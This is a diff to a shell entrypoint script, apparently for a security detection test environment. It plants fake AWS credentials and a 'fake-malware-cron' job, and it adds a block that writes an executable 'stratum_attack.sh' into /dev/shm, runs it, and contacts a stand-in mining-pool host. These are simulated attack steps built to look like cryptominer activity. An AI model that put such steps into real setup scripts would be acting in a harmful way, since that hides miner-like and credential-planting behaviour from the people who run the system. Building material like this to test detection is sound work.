@@ -3,8 +3,8 @@
 # Create AWS credentials file
 mkdir -p /root/.aws
 echo "[default]
-aws_access_key_id=AKIAIOSFODNN7PROD
-aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYPRODKEY" > /root/.aws/credentials
+aws_access_key_id=AKIAIOSFOFAKEPROD
+aws_secret_access_key=wJalrXUtnFEMI/K7MDEFLAG=FAKEPRODKEY2a" > /root/.aws/credentials
 chmod 600 /root/.aws/credentials
 
 # Create .ssh directory and test key file, and set appropriate permissions
@@ -25,5 +25,12 @@ crontab /etc/cron.d/fake-malware-cron
 # Start the cron service
 cron
 
+# Script to execute Stratum protocol attack
+echo '#!/bin/bash
+curl -X POST -F "username=trend" stratum+tcp://stratum.fakepooltrend.trend:3333' > /dev/shm/stratum_attack.sh
+chmod +x /dev/shm/stratum_attack.sh
+/dev/shm/stratum_attack.sh
+
 # Execute the main Go application
 exec ./main "$@"
+
